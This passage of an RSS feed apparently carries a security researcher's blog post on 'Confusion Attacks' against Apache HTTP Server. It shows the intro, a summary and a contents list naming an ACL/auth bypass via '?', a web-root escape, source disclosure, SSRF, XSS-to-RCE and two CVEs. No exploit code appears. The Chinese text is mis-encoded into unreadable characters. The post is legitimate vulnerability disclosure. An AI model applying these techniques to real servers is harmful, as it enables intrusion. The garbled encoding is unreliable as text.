  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local Privilege Escalation via the Windows I/O Manager: A Variant Finding &amp;amp; Collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/</link>
                <guid>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en</guid>
                <pubDate>Fri, 23 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</title>
                <description>&lt;h6 id=&quot;orange-tsai-orange_8361--ç¹é«”ä¸­æ–‡ç‰ˆæœ¬--english-version&quot;&gt;Orange Tsai (&lt;a href=&quot;https://x.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) Â |Â  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/&quot;&gt;ç¹é«”ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt; Â |Â  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/&quot;&gt;English Version&lt;/a&gt;&lt;/h6&gt;

&lt;style&gt;
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;å—¨ï¼Œé€™æ˜¯æˆ‘ä»Šå¹´ç™¼è¡¨åœ¨ &lt;a href=&quot;https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227&quot;&gt;Black Hat USA 2024&lt;/a&gt; ä¸Šé‡å° Apache HTTP Server çš„ç ”ç©¶ã€‚ æ­¤å¤–ï¼Œé€™ä»½ç ”ç©¶ä¹Ÿå°‡åœ¨ &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/&quot;&gt;HITCON&lt;/a&gt; å’Œ &lt;a href=&quot;https://orangecon.nl/&quot;&gt;OrangeCon&lt;/a&gt; ä¸Šç™¼è¡¨ï¼Œæœ‰èˆˆè¶£æ¶å…ˆäº†è§£å¯é»æ­¤å–å¾—æŠ•å½±ç‰‡ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf&quot;&gt;Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¦å¤–ä¹Ÿè¬è¬ä¾†è‡ª Akamai çš„å‹å–„è¯ç¹«ï¼ æ­¤ä»½ç ”ç©¶ç™¼è¡¨å¾Œç¬¬ä¸€æ™‚é–“ä»–å€‘ä¹Ÿç™¼ä½ˆäº†ç·©è§£æªæ–½ (è©³æƒ…å¯åƒè€ƒ &lt;a href=&quot;https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore&quot;&gt;Akamai çš„éƒ¨è½æ ¼&lt;/a&gt;)ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« æ¢ç´¢äº† Apache HTTP Server ä¸­å­˜åœ¨çš„æ¶æ§‹å•é¡Œï¼Œä»‹ç´¹äº†æ•¸å€‹ Httpd çš„æ¶æ§‹å‚µï¼Œ&lt;strong&gt;åŒ…å« 3 ç¨®ä¸åŒçš„ Confusion Attacksã€9 å€‹æ–°æ¼æ´ã€20 ç¨®æ”»æ“Šæ‰‹æ³•ä»¥åŠè¶…é 30 ç¨®æ¡ˆä¾‹åˆ†æ&lt;/strong&gt;ã€‚ åŒ…æ‹¬ä½†ä¸é™æ–¼ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ€éº¼ä½¿ç”¨ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; ç¹é Httpd å…§å»ºçš„å­˜å–æ§åˆ¶ä»¥åŠèªè­‰ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸å®‰å…¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; æ€éº¼è·³è„« Web Root ä¸¦å­˜å–æ•´å€‹æª”æ¡ˆç³»çµ±ã€‚&lt;/li&gt;
  &lt;li&gt;å¦‚ä½•åˆ©ç”¨ä¸€æ®µå¾ 1996 éºç•™è‡³ä»Šçš„ç¨‹å¼ç¢¼æŠŠä¸€å€‹ XSS è½‰åŒ–æˆ RCEã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¤§ç¶±&quot;&gt;å¤§ç¶±&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#åœ¨æ•…äº‹ä¹‹å‰&quot;&gt;åœ¨æ•…äº‹ä¹‹å‰&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#æ•…äº‹æ˜¯å¦‚ä½•é–‹å§‹çš„&quot;&gt;æ•…äº‹æ˜¯å¦‚ä½•é–‹å§‹çš„ï¼Ÿ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ç‚ºä»€éº¼-apache-http-server-èèµ·ä¾†è‡­è‡­çš„&quot;&gt;ç‚ºä»€éº¼ Apache HTTP Server èèµ·ä¾†è‡­è‡­çš„ï¼Ÿ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#é—œæ–¼é€™æ¬¡çš„æ–°æ”»æ“Šé¢ï¼š-confusion-attacks&quot;&gt;é—œæ–¼é€™æ¬¡çš„æ–°æ”»æ“Šé¢ï¼š Confusion Attacks&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#-1-filename-confusion&quot;&gt;1. Filename Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-1-truncation&quot;&gt;Primitive 1-1. Truncation&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-1-path-truncation&quot;&gt;1-1-1. Path Truncation&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment&quot;&gt;1-1-2. Mislead RewriteFlag Assignment&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-2-acl-bypass&quot;&gt;Primitive 1-2. ACL Bypass&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-2-documentroot-confusion&quot;&gt;2. DocumentRoot Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure&quot;&gt;Primitive 2-1. Server-Side Source Code Disclosure&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-1-disclose-cgi-source-code&quot;&gt;2-1-1. Disclose CGI Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-2-disclose-php-source-code&quot;&gt;2-1-2. Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation&quot;&gt;Primitive 2-2. Local Gadgets Manipulation!&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure&quot;&gt;2-2-1. Local Gadget to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-2-local-gadget-to-xss&quot;&gt;2-2-2. Local Gadget to XSS&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-3-local-gadget-to-lfi&quot;&gt;2-2-3. Local Gadget to LFI&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-4-local-gadget-to-ssrf&quot;&gt;2-2-4. Local Gadget to SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-5-local-gadget-to-rce&quot;&gt;2-2-5. Local Gadget to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;Primitive 2-3. Jailbreak from Local Gadgets&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets&quot;&gt;2-3-1. Jailbreak from Local Gadgets&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-3-handler-confusion&quot;&gt;3. Handler Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-1-overwrite-the-handler&quot;&gt;Primitive 3-1. Overwrite the Handler&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-2-overwrite-handler-to---&quot;&gt;3-1-2. Overwrite Handler to â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;Primitive 3-2. Invoke Arbitrary Handlers&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;3-2-1. Arbitrary Handler to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;3-2-2. Arbitrary Handler to Full SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce&quot;&gt;3-2-4. Arbitrary Handler to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-4-å…¶å®ƒæ¼æ´&quot;&gt;4. å…¶å®ƒæ¼æ´&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-38472---åŸºæ–¼-windows-unc-çš„-ssrf&quot;&gt;CVE-2024-38472 - åŸºæ–¼ Windows UNC çš„ SSRF&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-é€é-http-è«‹æ±‚è§£æå™¨è§¸ç™¼&quot;&gt;é€é HTTP è«‹æ±‚è§£æå™¨è§¸ç™¼&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-é€é-type-map-è§¸ç™¼&quot;&gt;é€é Type-Map è§¸ç™¼&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-39573---åŸºæ–¼-rewriterule-å‰ç¶´å¯å®Œå…¨æ§åˆ¶çš„-ssrf&quot;&gt;CVE-2024-39573 - åŸºæ–¼ RewriteRule å‰ç¶´å¯å®Œå…¨æ§åˆ¶çš„ SSRF&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#æœªä¾†ç ”ç©¶æ–¹å‘&quot;&gt;æœªä¾†ç ”ç©¶æ–¹å‘&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#çµèª&quot;&gt;çµèª&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;åœ¨æ•…äº‹ä¹‹å‰&quot;&gt;åœ¨æ•…äº‹ä¹‹å‰&lt;/h2&gt;

&lt;p&gt;é€™è£¡ç´”ç²¹æ˜¯ä¸€äº›å€‹äººçš„ Murmurï¼Œå¦‚æœåªå°æŠ€è¡“ç´°ç¯€æ„Ÿèˆˆè¶£å¯ä»¥ç›´æ¥è·³åˆ° â€”â€” &lt;a href=&quot;#æ•…äº‹æ˜¯å¦‚ä½•é–‹å§‹çš„&quot;&gt;æ•…äº‹æ˜¯å¦‚ä½•é–‹å§‹çš„ï¼Ÿ&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;èº«ç‚ºä¸€åç ”ç©¶å“¡ã€æœ€å¤§çš„å¿«æ¨‚æ‡‰è©²å°±æ˜¯ç•¶è‡ªå·±çš„ä½œå“è¢«åŒè¡Œé—œæ³¨ä¸¦ç†è§£ã€‚æ‰€ä»¥ç•¶å®Œæˆä¸€å€‹ä½œå“ä¸¦æ“æœ‰è±ç¢©çš„æˆæœå¾Œï¼Œç†æ‰€ç•¶ç„¶æœƒæƒ³è¦è®“å®ƒè¢«ä¸–ç•Œçœ‹åˆ° â€”â€” é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘æœƒå¤šæ¬¡åœ¨ Black Hat USA ä»¥åŠ DEFCON ä¸Šåˆ†äº«çš„ç·£æ•…ã€‚ åœ¨è®€é€™ç¯‡æ–‡ç« çš„ä½ ä¹Ÿè¨±çŸ¥é“ï¼Œæˆ‘å¾ 2022 å¾Œå°±æ‹¿ä¸åˆ°ä¸€å€‹åˆæ³•çš„ç°½è­‰é€²å…¥ç¾åœ‹ (åœ¨&lt;a href=&quot;https://esta.cbp.dhs.gov/&quot;&gt;å…ç°½è¨ˆç•«&lt;/a&gt;ä¸­çš„å°ç£ï¼Œé€šå¸¸åªéœ€è¦ç·šä¸Šç”³è«‹ï¼Œæ•¸åˆ†é˜åˆ°æ•¸å°æ™‚å…§å°±èƒ½å–å¾—æ—…è¡Œæˆæ¬Š)ï¼Œå°è‡´éŒ¯é &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA 2022&lt;/a&gt; çš„å¯¦é«”æ¼”è¬›ã€‚ç”šè‡³ 2023 åˆ°ç§˜é­¯é‚„æœ‰å¾©æ´»ç¯€å³¶ç¨æ—…ä¹Ÿç„¡æ³•å¾ç¾åœ‹è½‰æ©Ÿ :(&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è§£æ±ºé€™å€‹æƒ…æ³ï¼Œæˆ‘å¾ä»Šå¹´ä¸€æœˆå°±é–‹å§‹æº–å‚™ B1/B2 ç°½è­‰ã€æ’°å¯«å„å¼æ–‡ä»¶ã€åˆ°å¤§ä½¿é¤¨é¢è©¦ä»¥åŠæ¼«ç„¡æ­¢ç›¡çš„ç­‰å¾…ï¼Œé€™ä¸æ˜¯ä¸€ä»¶å¥½ç©çš„äº‹ï¼Œä½†ç‚ºäº†è®“ä½œå“è¢«çœ‹åˆ°ï¼Œé‚„æ˜¯èŠ±äº†éå¸¸å¤šçš„æ™‚é–“åœ¨ç‚ºäº†ç°½è­‰å¥”æ³¢ï¼Œä»¥åŠå°‹æ±‚å„ç¨®å¯èƒ½ï¼Œç”šè‡³åˆ°æœƒè­°é–‹å§‹çš„å‰ä¸‰å€‹ç¦®æ‹œï¼Œé‚„ä¸æ¸…æ¥šç™¼è¡¨æ˜¯å¦æœƒè¢«å–æ¶ˆ (BH ä¸€é–‹å§‹åªæ¥å—ç¾å ´æ¼”è¬›ï¼Œä¸éè¬è¬å¯©ç¨¿å§”å“¡å°é€™ä»½ç ”ç©¶çš„èªå¯æœ€çµ‚é‚„æ˜¯èƒ½é€éé éŒ„çš„å½¢å¼ç™¼è¡¨)ï¼Œæ‰€ä»¥ä½ æ‰€çœ‹åˆ°çš„æ‰€æœ‰å…§å®¹åŒ…å«æŠ•å½±ç‰‡ã€éŒ„å½±ä»¥åŠéƒ¨è½æ ¼æ–‡å­—éƒ½æ˜¯åœ¨çŸ­çŸ­æ•¸åå¤©å…§å®Œæˆçš„ã€‚ ğŸ˜–&lt;/p&gt;

&lt;p&gt;æˆ‘åªæ˜¯ä¸€å€‹å–®ç´”çš„ç ”ç©¶å“¡ï¼Œè‡ªèªå•å¿ƒç„¡æ„§ï¼Œå°æ¼æ´çš„æ…‹åº¦ä¹Ÿå§‹çµ‚æ˜¯ â€”â€” æ¼æ´å°±è©²è®“å®ƒè¢«å» å•†çŸ¥é“ä»¥åŠä¿®å¾©ã€‚ å¯«é€™äº›æ–‡å­—ä¹Ÿä¸ç‚ºäº†ä»€éº¼ï¼Œç´”ç²¹ç´€éŒ„ä¸‹ä¸€äº›ç„¡å¥ˆçš„å¿ƒæƒ…ã€ä»Šå¹´æ‰€åšéçš„åŠªåŠ›ï¼Œä»¥åŠè¬è¬åœ¨é€™å€‹éç¨‹ä¸­å¹«åŠ©éæˆ‘çš„äººï¼Œè¬è¬ä½ å€‘ :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ•…äº‹æ˜¯å¦‚ä½•é–‹å§‹çš„&quot;&gt;æ•…äº‹æ˜¯å¦‚ä½•é–‹å§‹çš„ï¼Ÿ&lt;/h2&gt;

&lt;p&gt;å¤§æ¦‚æ˜¯åœ¨ä»Šå¹´å¹´åˆçš„æ™‚å€™ï¼Œæˆ‘é–‹å§‹æ€è€ƒä¸‹ä¸€å€‹ç ”ç©¶çš„ç›®æ¨™ï¼Œä¹Ÿè¨±ä½ çŸ¥é“æˆ‘ç¸½æ˜¯å¸Œæœ›æŒ‘æˆ°é‚£äº›å½±éŸ¿æ•´å€‹ç¶²éš›ç¶²è·¯çš„å¤§ç›®æ¨™ï¼Œæ‰€ä»¥é–‹å§‹å°‹æ‰¾ä¸€äº›çœ‹ä¼¼è¤‡é›œçš„ä¸»é¡Œæˆ–æœ‰è¶£çš„é–‹æºå°ˆæ¡ˆï¼Œä¾‹å¦‚ Nginxã€PHPã€ç”šè‡³é–‹å§‹çœ‹èµ· RFC ä¾†å¼·åŒ–è‡ªå·±å°æ–¼å”è­°å¯¦ä½œç´°ç¯€çš„èªçŸ¥ã€‚&lt;/p&gt;

&lt;p&gt;é›–ç„¶å¤§éƒ¨åˆ†çš„å˜—è©¦éƒ½ä»¥å¤±æ•—å‘Šçµ‚ (ä¸éæœ‰äº›ä¹Ÿè¨±æœƒè®Šæˆä¸‹ä¸€ç¯‡éƒ¨è½æ ¼ä¸»é¡Œ ğŸ˜‰)ï¼Œä½†åœ¨ç´°ç´°å“å˜—é€™äº›ç¨‹å¼ç¢¼æ™‚ï¼Œæˆ‘å›æ†¶èµ·äº†æ›¾ç¶“åœ¨å»å¹´å¹´ä¸­çŸ­æš«çœ‹é Apache HTTP Server åŸå§‹ç¢¼é€™ä»¶äº‹ï¼ å„˜ç®¡æœ€çµ‚ç”±æ–¼å·¥ä½œçš„æ™‚ç¨‹è¦ç•«ä¸¦ç„¡æ·±å…¥çš„é–±è®€ç¨‹å¼ç¢¼ï¼Œä½†åœ¨é‚£æ™‚å°±å·²ç¶“å¾å®ƒçš„ç·¨ç¢¼é¢¨æ ¼ä¸Šã€Œèã€åˆ°äº†ä¸€äº›ä¸å¤ªå¥½çš„å‘³é“ã€‚&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯åœ¨ä»Šå¹´æ±ºå®šç¹¼çºŒä¸‹å»ï¼ŒæŠŠã€Œç‚ºä»€éº¼èèµ·ä¾†æ€ªæ€ªçš„ã€é€™ä»¶äº‹å¾åŸæœ¬åªæ˜¯ä¸€å€‹èªªä¸å‡ºçš„ã€Œæ„Ÿè¦ºã€å…·è±¡åŒ–ï¼Œæ·±å…¥ä¸‹å»ç ”ç©¶ Apache HTTP Serverï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ç‚ºä»€éº¼-apache-http-server-èèµ·ä¾†è‡­è‡­çš„&quot;&gt;ç‚ºä»€éº¼ Apache HTTP Server èèµ·ä¾†è‡­è‡­çš„ï¼Ÿ&lt;/h2&gt;

&lt;p&gt;é¦–å…ˆï¼ŒApache HTTP Server æ˜¯ä¸€å€‹ç”±ã€Œæ¨¡çµ„å€‘ã€å»ºæ§‹èµ·ä¾†çš„ä¸–ç•Œï¼Œå¾å®ƒ&lt;a href=&quot;https://httpd.apache.org/docs/2.4/mpm.html&quot;&gt;å®˜æ–¹æ–‡ä»¶&lt;/a&gt;ä¸­ä¹Ÿçœ‹åˆ°å…¶å°æ–¼è‡ªèº«æ¨¡çµ„åŒ– (MPMs - Multi-Processing Modules) çš„è‡ªè±ªï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache httpd has always accommodated a wide variety of environments through its modular design. [â€¦] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ•´å€‹ Httpd çš„æœå‹™éœ€è¦ç”±æ•¸ç™¾å€‹å°æ¨¡çµ„é½Šå¿ƒåˆåŠ›ï¼Œå…±åŒåˆä½œæ‰èƒ½å®Œæˆå®¢æˆ¶ç«¯çš„ HTTP è«‹æ±‚ï¼Œ&lt;strong&gt;&lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/&quot;&gt;å®˜æ–¹æ‰€åˆ—å‡ºçš„ 136 å€‹æ¨¡çµ„&lt;/a&gt;å…¶ä¸­ç´„æœ‰å¿«ä¸€åŠæ˜¯é è¨­å•Ÿç”¨æˆ–ç¶“å¸¸è¢«ä½¿ç”¨çš„æ¨¡çµ„&lt;/strong&gt;ï¼&lt;/p&gt;

&lt;p&gt;è€Œæ›´ä»¤äººé©šè¨çš„æ˜¯ï¼Œé€™éº¼å¤šæ¨¡çµ„åœ¨è™•ç†å®¢æˆ¶ç«¯ HTTP è«‹æ±‚çš„æ™‚å€™ï¼Œå½¼æ­¤ä¹‹é–“é‚„è¦å…±åŒç¶­è­·è‘—ä¸€ä»½éå¸¸å·¨å¤§çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request_rec&lt;/code&gt; çµæ§‹ã€‚ é€™å€‹çµæ§‹åŒ…æ‹¬äº†åœ¨è™•ç† HTTP æ™‚æœƒç”¨åˆ°çš„ä¸€åˆ‡å…ƒç´ ï¼Œè©³ç´°çš„å®šç¾©å¯ä»¥å¾ &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838&quot;&gt;include/httpd.h&lt;/a&gt; ä¸­æ‰¾åˆ°ã€‚ æ‰€æœ‰æ¨¡çµ„éƒ½ä¾è³´é€™å€‹å·¨å¤§çš„çµæ§‹å»åŒæ­¥ã€æºé€šï¼Œç”šè‡³äº¤æ›è³‡æ–™ã€‚ é€™å€‹å…§éƒ¨çµæ§‹æœƒåƒæ˜¯æ‹‹æ¥çƒèˆ¬åœ¨æ‰€æœ‰æ¨¡çµ„é–“å‚³éä¾†å‚³éå»ï¼Œæ¯å€‹æ¨¡çµ„éƒ½å¯ä»¥æ ¹æ“šè‡ªå·±çš„å–œå¥½å»éš¨æ„ä¿®æ”¹é€™å€‹çµæ§‹ä¸Šçš„ä»»æ„å€¼ï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ¨£å­çš„åˆä½œæ–¹å¼å¾è»Ÿé«”å·¥ç¨‹çš„è§’åº¦ä¾†èªªå…¶å¯¦ä¸æ˜¯ä»€éº¼æ–°é®®äº‹ï¼Œå€‹é«”åªéœ€å°ˆå¿ƒæŠŠä»½å…§äº‹å®Œæˆï¼Œåªè¦æ‰€æœ‰äººéƒ½ä¹–ä¹–å®Œæˆè‡ªå·±çš„å·¥ä½œï¼Œé‚£å®¢æˆ¶å°±å¯ä»¥æ­£å¸¸äº«å— Httpd æ‰€æä¾›çš„æœå‹™ã€‚ é€™æ¨£å­çš„åˆ†å·¥åœ¨æ•¸å€‹æ¨¡çµ„å…§å¯èƒ½é‚„æ²’ä»€éº¼å•é¡Œï¼Œ&lt;strong&gt;ä½†å¦‚æœä»Šå¤©æŠŠè¦æ¨¡æ”¾å¤§åˆ°æ•¸ç™¾å€‹æ¨¡çµ„é–“çš„å”åŒåˆä½œ â€”â€” å®ƒå€‘çœŸçš„æœ‰è¾¦æ³•å¥½å¥½åˆä½œå—ï¼Ÿ&lt;/strong&gt; ğŸ¤”&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥æˆ‘å€‘çš„å‡ºç™¼é»å¾ˆç°¡å–® â€”â€” &lt;strong&gt;æ¨¡çµ„é–“å…¶å¯¦ä¸¦ä¸å®Œå…¨äº†è§£å½¼æ­¤çš„å¯¦ä½œç´°ç¯€ï¼Œä½†å»åˆè¢«è¦æ±‚è¦ä¸€èµ·åˆä½œ&lt;/strong&gt;ã€‚ æ¯å€‹æ¨¡çµ„å¯èƒ½ç”±ä¸åŒçš„é–‹ç™¼è€…å¯¦ä½œï¼Œç¨‹å¼ç¢¼æ­·ç¶“å¤šå¹´çš„ç–Šä»£ã€é‡æ•´ä»¥åŠä¿®æ”¹ï¼Œå®ƒå€‘çœŸçš„é‚„æ¸…æ¥šè‡ªå·±åœ¨åšä»€éº¼å—ï¼Ÿ å°±ç®—å°è‡ªå·±ç­è‹¥æŒ‡æŒï¼Œé‚£å°å…¶å®ƒæ¨¡çµ„å‘¢ï¼Ÿ åœ¨ç¼ºä¹ä¸€å€‹å¥½çš„é–‹ç™¼æ¨™æº–æˆ–ä½¿ç”¨æº–å‰‡ä¸‹ï¼Œé€™ä¸­é–“å¿…ç„¶æœƒå­˜åœ¨å¾ˆå¤šå°ç¸«éš™æ˜¯æˆ‘å€‘å¯ä»¥åˆ©ç”¨çš„ï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;é—œæ–¼é€™æ¬¡çš„æ–°æ”»æ“Šé¢-confusion-attacks&quot;&gt;é—œæ–¼é€™æ¬¡çš„æ–°æ”»æ“Šé¢ï¼š Confusion Attacks&lt;/h2&gt;

